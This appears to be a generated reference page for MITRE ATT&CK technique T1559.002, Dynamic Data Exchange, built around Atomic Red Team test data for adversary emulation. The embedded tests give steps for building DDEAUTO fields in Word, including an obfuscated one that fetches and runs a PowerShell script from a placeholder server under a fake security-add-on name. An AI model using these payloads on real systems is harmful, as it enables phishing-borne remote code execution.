
# Dynamic Data Exchange

## Description

### MITRE Description

> Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1559/002

## Potential Commands

```
start $PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx
```

## Commands Dataset

```
[{'command': 'start $PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\n',
  'name': None,
  'source': 'atomics/T1559.002/T1559.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Inter-Process Communication: Dynamic Data Exchange': {'atomic_tests': [{'auto_generated_guid': 'f592ba2a-e9e8-4d62-a459-ef63abd819fd',
                                                                                                  'description': 'Executes '
                                                                                                                 'commands '
                                                                                                                 'via '
                                                                                                                 'DDE '
                                                                                                                 'using '
                                                                                                                 'Microsfot '
                                                                                                                 'Word\n',
                                                                                                  'executor': {'name': 'manual',
                                                                                                               'steps': 'Open '
                                                                                                                        'Microsoft '
                                                                                                                        'Word\n'
                                                                                                                        '\n'
                                                                                                                        'Insert '
                                                                                                                        'tab '
                                                                                                                        '-> '
                                                                                                                        'Quick '
                                                                                                                        'Parts '
                                                                                                                        '-> '
                                                                                                                        'Field\n'
                                                                                                                        '\n'
                                                                                                                        'Choose '
                                                                                                                        '= '
                                                                                                                        '(Formula) '
                                                                                                                        'and '
                                                                                                                        'click '
                                                                                                                        'ok.\n'
                                                                                                                        '\n'
                                                                                                                        'After '
                                                                                                                        'that, '
                                                                                                                        'you '
                                                                                                                        'should '
                                                                                                                        'see '
                                                                                                                        'a '
                                                                                                                        'Field '
                                                                                                                        'inserted '
                                                                                                                        'in '
                                                                                                                        'the '
                                                                                                                        'document '
                                                                                                                        'with '
                                                                                                                        'an '
                                                                                                                        'error '
                                                                                                                        '"!Unexpected '
                                                                                                                        'End '
                                                                                                                        'of '
                                                                                                                        'Formula", '
                                                                                                                        'right-click '
                                                                                                                        'the '
                                                                                                                        'Field, '
                                                                                                                        'and '
                                                                                                                        'choose '
                                                                                                                        'Toggle '
                                                                                                                        'Field '
                                                                                                                        'Codes.\n'
                                                                                                                        '\n'
                                                                                                                        'The '
                                                                                                                        'Field '
                                                                                                                        'Code '
                                                                                                                        'should '
                                                                                                                        'now '
                                                                                                                        'be '
                                                                                                                        'displayed, '
                                                                                                                        'change '
                                                                                                                        'it '
                                                                                                                        'to '
                                                                                                                        'Contain '
                                                                                                                        'the '
                                                                                                                        'following:\n'
                                                                                                                        '\n'
                                                                                                                        '{DDEAUTO '
                                                                                                                        'c:\\\\windows\\\\system32\\\\cmd.exe '
                                                                                                                        '"/k '
                                                                                                                        'calc.exe"  '
                                                                                                                        '}\n'},
                                                                                                  'name': 'Execute '
                                                                                                          'Commands',
                                                                                                  'supported_platforms': ['windows']},
                                                                                                 {'auto_generated_guid': '47c21fb6-085e-4b0d-b4d2-26d72c3830b3',
                                                                                                  'description': 'When '
                                                                                                                 'the '
                                                                                                                 'word '
                                                                                                                 'document '
                                                                                                                 'opens '
                                                                                                                 'it '
                                                                                                                 'will '
                                                                                                                 'prompt '
                                                                                                                 'the '
                                                                                                                 'user '
                                                                                                                 'to '
                                                                                                                 'click '
                                                                                                                 'ok '
                                                                                                                 'on '
                                                                                                                 'a '
                                                                                                                 'dialogue '
                                                                                                                 'box, '
                                                                                                                 'then '
                                                                                                                 'attempt '
                                                                                                                 'to '
                                                                                                                 'run '
                                                                                                                 'PowerShell '
                                                                                                                 'with '
                                                                                                                 'DDEAUTO '
                                                                                                                 'to '
                                                                                                                 'download '
                                                                                                                 'and '
                                                                                                                 'execute '
                                                                                                                 'a '
                                                                                                                 'powershell '
                                                                                                                 'script\n',
                                                                                                  'executor': {'command': 'start '
                                                                                                                          '$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\n',
                                                                                                               'name': 'command_prompt'},
                                                                                                  'name': 'Execute '
                                                                                                          'PowerShell '
                                                                                                          'script '
                                                                                                          'via '
                                                                                                          'Word '
                                                                                                          'DDE',
                                                                                                  'supported_platforms': ['windows']},
                                                                                                 {'auto_generated_guid': 'cf91174c-4e74-414e-bec0-8d60a104d181',
                                                                                                  'description': '\n'
                                                                                                                 'TrustedSec '
                                                                                                                 '- '
                                                                                                                 'Unicorn '
                                                                                                                 '- '
                                                                                                                 'https://github.com/trustedsec/unicorn\n'
                                                                                                                 '\n'
                                                                                                                 'SensePost '
                                                                                                                 'DDEAUTO '
                                                                                                                 '- '
                                                                                                                 'https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n'
                                                                                                                 '\n'
                                                                                                                 'Word '
                                                                                                                 'VBA '
                                                                                                                 'Macro\n'
                                                                                                                 '\n'
                                                                                                                 "[Dragon's "
                                                                                                                 'Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n',
                                                                                                  'executor': {'name': 'manual',
                                                                                                               'steps': '1. '
                                                                                                                        'Open '
                                                                                                                        'Word\n'
                                                                                                                        '\n'
                                                                                                                        '2. '
                                                                                                                        'Insert '
                                                                                                                        'tab '
                                                                                                                        '-> '
                                                                                                                        'Quick '
                                                                                                                        'Parts '
                                                                                                                        '-> '
                                                                                                                        'Field\n'
                                                                                                                        '\n'
                                                                                                                        '3. '
                                                                                                                        'Choose '
                                                                                                                        '= '
                                                                                                                        '(Formula) '
                                                                                                                        'and '
                                                                                                                        'click '
                                                                                                                        'ok.\n'
                                                                                                                        '\n'
                                                                                                                        '4. '
                                                                                                                        'Once '
                                                                                                                        'the '
                                                                                                                        'field '
                                                                                                                        'is '
                                                                                                                        'inserted, '
                                                                                                                        'you '
                                                                                                                        'should '
                                                                                                                        'now '
                                                                                                                        'see '
                                                                                                                        '"!Unexpected '
                                                                                                                        'End '
                                                                                                                        'of '
                                                                                                                        'Formula"\n'
                                                                                                                        '\n'
                                                                                                                        '5. '
                                                                                                                        'Right-click '
                                                                                                                        'the '
                                                                                                                        'Field, '
                                                                                                                        'choose '
                                                                                                                        '"Toggle '
                                                                                                                        'Field '
                                                                                                                        'Codes"\n'
                                                                                                                        '\n'
                                                                                                                        '6. '
                                                                                                                        'Paste '
                                                                                                                        'in '
                                                                                                                        'the '
                                                                                                                        'code '
                                                                                                                        'from '
                                                                                                                        'Unicorn '
                                                                                                                        'or '
                                                                                                                        'SensePost\n'
                                                                                                                        '\n'
                                                                                                                        '7. '
                                                                                                                        'Save '
                                                                                                                        'the '
                                                                                                                        'Word '
                                                                                                                        'document.\n'
                                                                                                                        '\n'
                                                                                                                        '9. '
                                                                                                                        'DDEAUTO '
                                                                                                                        'c:\\\\windows\\\\system32\\\\cmd.exe '
                                                                                                                        '"/k '
                                                                                                                        'calc.exe"\n'
                                                                                                                        '\n'
                                                                                                                        '10. '
                                                                                                                        'DDEAUTO '
                                                                                                                        '"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ '
                                                                                                                        'QUOTE '
                                                                                                                        '87 '
                                                                                                                        '105 '
                                                                                                                        '110 '
                                                                                                                        '100 '
                                                                                                                        '111 '
                                                                                                                        '119 '
                                                                                                                        '115 '
                                                                                                                        '80 '
                                                                                                                        '111 '
                                                                                                                        '119 '
                                                                                                                        '101 '
                                                                                                                        '114 '
                                                                                                                        '83 '
                                                                                                                        '104 '
                                                                                                                        '101 '
                                                                                                                        '108 '
                                                                                                                        '108 '
                                                                                                                        '}\\\\v1.0\\\\{ '
                                                                                                                        'QUOTE '
                                                                                                                        '112 '
                                                                                                                        '111 '
                                                                                                                        '119 '
                                                                                                                        '101 '
                                                                                                                        '114 '
                                                                                                                        '115 '
                                                                                                                        '104 '
                                                                                                                        '101 '
                                                                                                                        '108 '
                                                                                                                        '108 '
                                                                                                                        '46 '
                                                                                                                        '101 '
                                                                                                                        '120 '
                                                                                                                        '101 '
                                                                                                                        '} '
                                                                                                                        '-w '
                                                                                                                        '1 '
                                                                                                                        '-nop '
                                                                                                                        '{ '
                                                                                                                        'QUOTE '
                                                                                                                        '105 '
                                                                                                                        '101 '
                                                                                                                        '120 '
                                                                                                                        '}(New-Object '
                                                                                                                        "System.Net.WebClient).DownloadString('http://<server>/download.ps1'); "
                                                                                                                        '# '
                                                                                                                        '" '
                                                                                                                        '"Microsoft '
                                                                                                                        'Document '
                                                                                                                        'Security '
                                                                                                                        'Add-On"\n'},
                                                                                                  'name': 'DDEAUTO',
                                                                                                  'supported_platforms': ['windows']}],
                                                                                'attack_technique': 'T1559.002',
                                                                                'display_name': 'Inter-Process '
                                                                                                'Communication: '
                                                                                                'Dynamic '
                                                                                                'Data '
                                                                                                'Exchange'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations


* [Software Configuration](../mitigations/Software-Configuration.md)

* [Application Isolation and Sandboxing](../mitigations/Application-Isolation-and-Sandboxing.md)
    
* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    
* [Behavior Prevention on Endpoint](../mitigations/Behavior-Prevention-on-Endpoint.md)
    

# Actors


* [Patchwork](../actors/Patchwork.md)

* [APT28](../actors/APT28.md)
    
* [FIN7](../actors/FIN7.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [APT37](../actors/APT37.md)
    
* [Gallmaker](../actors/Gallmaker.md)
    
* [TA505](../actors/TA505.md)
    
* [Sharpshooter](../actors/Sharpshooter.md)
    
